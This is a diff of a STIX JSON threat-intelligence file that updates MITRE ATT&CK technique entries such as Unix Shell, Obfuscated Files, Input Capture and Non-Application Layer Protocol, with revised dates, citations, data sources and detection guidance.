-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1059/004",
-          "external_id": "T1059.004"
+          "source_name": "Apple ZShell",
+          "url": "https://support.apple.com/HT208050",
+          "description": "Apple. (2020, January 28). Use zsh as the default shell on your Mac. Retrieved June 12, 2020."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. "
-      ],
+      "x_mitre_detection": "Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. ",
       "x_mitre_platforms": [
         "Linux",
         "macOS"
       ],
       "x_mitre_data_sources": [
-        "File monitoring",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": true,
       "x_mitre_permissions_required": [
-        "User",
-        "root"
+        "root",
+        "User"
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_version": "1.0",
+      "x_panw_parent_technique": "Command and Scripting Interpreter",
+      "x_panw_parent_technique_subtechnique": "Command and Scripting Interpreter: Unix Shell"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:44.085Z",
+      "created": "2020-03-14T18:18:32.443Z",
+      "modified": "2020-03-26T22:02:25.221Z",
       "name": "T1571: Non-Standard Port",
       "description": "Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.",
       "kill_chain_phases": [
@@ -1436,11 +1502,6 @@
       ],
       "external_references": [
         {
-          "source_name": "Fortinet Agent Tesla April 2018",
-          "url": "https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html",
-          "description": "Zhang, X. (2018, April 05). Analysis of New Agent Tesla Spyware Variant. Retrieved November 5, 2018."
-        },
-        {
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1571",
           "external_id": "T1571"
@@ -1451,6 +1512,11 @@
           "description": "Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019."
         },
         {
+          "source_name": "Fortinet Agent Tesla April 2018",
+          "url": "https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html",
+          "description": "Zhang, X. (2018, April 05). Analysis of New Agent Tesla Spyware Variant. Retrieved November 5, 2018."
+        },
+        {
           "source_name": "University of Birmingham C2",
           "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
           "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016."
@@ -1459,30 +1525,28 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)"
-      ],
+      "x_mitre_detection": "Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "Netflow/Enclave netflow",
-        "Packet capture",
-        "Process monitoring",
-        "Process use of network"
+        "Network Traffic: Network Connection Creation",
+        "Network Traffic: Network Traffic Content",
+        "Network Traffic: Network Traffic Flow"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_version": "1.0"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:36.653Z",
+      "created": "2017-05-31T21:30:32.662Z",
+      "modified": "2021-04-24T13:19:18.594Z",
       "name": "T1027: Obfuscated Files or Information",
-      "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",
+      "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) ",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -1495,9 +1559,24 @@
       ],
       "external_references": [
         {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1027",
+          "external_id": "T1027"
+        },
+        {
           "source_name": "capec",
           "url": "https://capec.mitre.org/data/definitions/267.html",
           "external_id": "CAPEC-267"
+        },
+        {
+          "source_name": "Volexity PowerDuke November 2016",
+          "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/",
+          "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017."
+        },
+        {
+          "source_name": "Linux/Cdorked.A We Live Security Analysis",
+          "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/",
+          "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017."
         },
         {
           "source_name": "Carbon Black Obfuscation Sept 2016",
@@ -1515,9 +1594,9 @@
           "description": "Bohannon, D. & Holmes, L. (2017, July 27). Revoke-Obfuscation: PowerShell Obfuscation Detection Using Science. Retrieved February 12, 2018."
         },
         {
-          "source_name": "GitHub Office-Crackros Aug 2016",
-          "url": "https://github.com/itsreallynick/office-crackros",
-          "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018."
+          "source_name": "PaloAlto EncodedCommand March 2017",
+          "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
+          "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018."
         },
         {
           "source_name": "GitHub Revoke-Obfuscation",
@@ -1525,51 +1604,29 @@
           "description": "Bohannon, D. (2017, July 27). Revoke-Obfuscation. Retrieved February 12, 2018."
         },
         {
-          "source_name": "Linux/Cdorked.A We Live Security Analysis",
-          "url": "https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/",
-          "description": "Pierre-Marc Bureau. (2013, April 26). Linux/Cdorked.A: New Apache backdoor being used in the wild to serve Blackhole. Retrieved September 10, 2017."
-        },
-        {
-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1027",
-          "external_id": "T1027"
-        },
-        {
-          "source_name": "PaloAlto EncodedCommand March 2017",
-          "url": "https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
-          "description": "White, J. (2017, March 10). Pulling Back the Curtains on EncodedCommand PowerShell Attacks. Retrieved February 12, 2018."
-        },
-        {
-          "source_name": "Volexity PowerDuke November 2016",
-          "url": "https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/",
-          "description": "Adair, S.. (2016, November 9). PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs. Retrieved January 11, 2017."
+          "source_name": "GitHub Office-Crackros Aug 2016",
+          "url": "https://github.com/itsreallynick/office-crackros",
+          "description": "Carr, N. (2016, August 14). OfficeCrackros. Retrieved February 12, 2018."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. "
-      ],
+      "x_mitre_detection": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "Binary file metadata",
-        "Email gateway",
-        "Environment variable",
-        "File monitoring",
-        "Malware reverse engineering",
-        "Network intrusion detection system",
-        "Network protocol analysis",
-        "Process command-line parameters",
-        "Process monitoring",
-        "Process use of network",
-        "SSL/TLS inspection",
-        "Windows event logs"
+        "Command: Command Execution",
+        "Command: Command Execution",
+        "File: File Content",
+        "File: File Creation",
+        "File: File Metadata",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_defense_bypassed": [
         "Application control",
         "Application control by file name or path",
@@ -1588,8 +1645,8 @@
       "type": "attack-pattern",
       "id": "attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:44.085Z",
+      "created": "2020-03-16T15:33:01.739Z",
+      "modified": "2021-04-20T19:27:46.650Z",
       "name": "T1573: Encrypted Channel",
       "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
       "kill_chain_phases": [
@@ -1627,30 +1684,24 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
-      ],
+      "x_mitre_detection": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "Malware reverse engineering",
-        "Netflow/Enclave netflow",
-        "Packet capture",
-        "Process monitoring",
-        "Process use of network",
-        "SSL/TLS inspection"
+        "Network Traffic: Network Traffic Content"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_version": "1.0"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.379Z",
+      "created": "2017-05-31T21:30:48.323Z",
+      "modified": "2020-10-21T01:31:35.760Z",
       "name": "T1056: Input Capture",
       "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).",
       "kill_chain_phases": [
@@ -1669,9 +1720,9 @@
       ],
       "external_references": [
         {
-          "source_name": "Adventures of a Keystroke",
-          "url": "http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf",
-          "description": "Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016."
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1056",
+          "external_id": "T1056"
         },
         {
           "source_name": "capec",
@@ -1679,54 +1730,49 @@
           "external_id": "CAPEC-569"
         },
         {
-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1056",
-          "external_id": "T1056"
+          "source_name": "Adventures of a Keystroke",
+          "url": "http://opensecuritytraining.info/Keylogging_files/The%20Adventures%20of%20a%20Keystroke.pdf",
+          "description": "Tinaztepe,  E. (n.d.). The Adventures of a Keystroke:  An in-depth look into keyloggers on Windows. Retrieved April 27, 2016."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke), monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present."
-      ],
+      "x_mitre_detection": "Detection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`)(Citation: Adventures of a Keystroke), monitoring for malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Network",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "API monitoring",
-        "Binary file metadata",
-        "DLL monitoring",
-        "Kernel drivers",
-        "Loaded DLLs",
-        "PowerShell logs",
-        "Process command-line parameters",
-        "Process monitoring",
-        "User interface",
-        "Windows Registry",
-        "Windows event logs"
+        "Driver: Driver Load",
+        "File: File Modification",
+        "Process: OS API Execution",
+        "Process: Process Creation",
+        "Process: Process Metadata",
+        "Windows Registry: Windows Registry Key Modification"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "Administrator",
+        "root",
         "SYSTEM",
-        "User",
-        "root"
+        "User"
       ],
       "x_mitre_contributors": [
         "John Lambert, Microsoft Threat Intelligence Center"
       ],
-      "x_mitre_version": "1.1"
+      "x_mitre_version": "1.2"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.764Z",
+      "created": "2017-05-31T21:31:10.728Z",
+      "modified": "2020-10-21T19:41:49.412Z",
       "name": "T1095: Non-Application Layer Protocol",
-      "description": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
+      "description": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution)\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -1739,59 +1785,63 @@
       ],
       "external_references": [
         {
-          "source_name": "Microsoft ICMP",
-          "url": "http://support.microsoft.com/KB/170292",
-          "description": "Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics. Retrieved December 1, 2014."
-        },
-        {
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1095",
           "external_id": "T1095"
         },
         {
-          "source_name": "University of Birmingham C2",
-          "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
-          "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016."
-        },
-        {
           "source_name": "Wikipedia OSI",
           "url": "http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29",
           "description": "Wikipedia. (n.d.). List of network protocols (OSI model). Retrieved December 4, 2014."
+        },
+        {
+          "source_name": "Cisco Synful Knock Evolution",
+          "url": "https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices",
+          "description": "Graham Holmes. (2015, October 8). Evolution of attacks on Cisco IOS devices. Retrieved October 19, 2020."
+        },
+        {
+          "source_name": "Microsoft ICMP",
+          "url": "http://support.microsoft.com/KB/170292",
+          "description": "Microsoft. (n.d.). Internet Control Message Protocol (ICMP) Basics. Retrieved December 1, 2014."
+        },
+        {
+          "source_name": "Cisco Blog Legacy Device Attacks",
+          "url": "https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954",
+          "description": "Omar Santos. (2020, October 19). Attackers Continue to Target Legacy Devices. Retrieved October 20, 2020."
+        },
+        {
+          "source_name": "University of Birmingham C2",
+          "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
+          "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels."
-      ],
+      "x_mitre_detection": "Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) \n\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Network",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "Host network interface",
-        "Netflow/Enclave netflow",
-        "Network intrusion detection system",
-        "Network protocol analysis",
-        "Packet capture",
-        "Process use of network"
+        "Network Traffic: Network Traffic Content",
+        "Network Traffic: Network Traffic Flow"
       ],
-      "x_mitre_network_requirements": [
-        "true"
-      ],
+      "x_mitre_is_subtechnique": false,
+      "x_mitre_network_requirements": true,
       "x_mitre_contributors": [
         "Ryan Becwar"
       ],
-      "x_mitre_version": "2.0"
+      "x_mitre_version": "2.1"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.379Z",
+      "created": "2020-03-09T14:38:24.334Z",
+      "modified": "2020-06-23T19:03:15.180Z",
       "name": "T1059.006: Python",
       "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
       "kill_chain_phases": [
@@ -1814,38 +1864,37 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script."
-      ],
+      "x_mitre_detection": "Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "API monitoring",
-        "Process command-line parameters",
-        "Process monitoring",
-        "System calls"
+        "Command: Command Execution",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": true,
       "x_mitre_permissions_required": [
         "Administrator",
-        "SYSTEM",
-        "root"
+        "root",
+        "SYSTEM"
       ],
       "x_mitre_system_requirements": [
         "Python is installed."
       ],
-      "x_mitre_version": "1.0"
+      "x_mitre_version": "1.0",
+      "x_panw_parent_technique": "Command and Scripting Interpreter",
+      "x_panw_parent_technique_subtechnique": "Command and Scripting Interpreter: Python"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2020-07-27T14:54:34.130Z",
-      "modified": "2020-07-27T14:54:34.130Z",
+      "created": "2020-03-09T14:29:51.508Z",
+      "modified": "2020-08-13T20:09:39.122Z",
       "name": "T1059.005: Visual Basic",
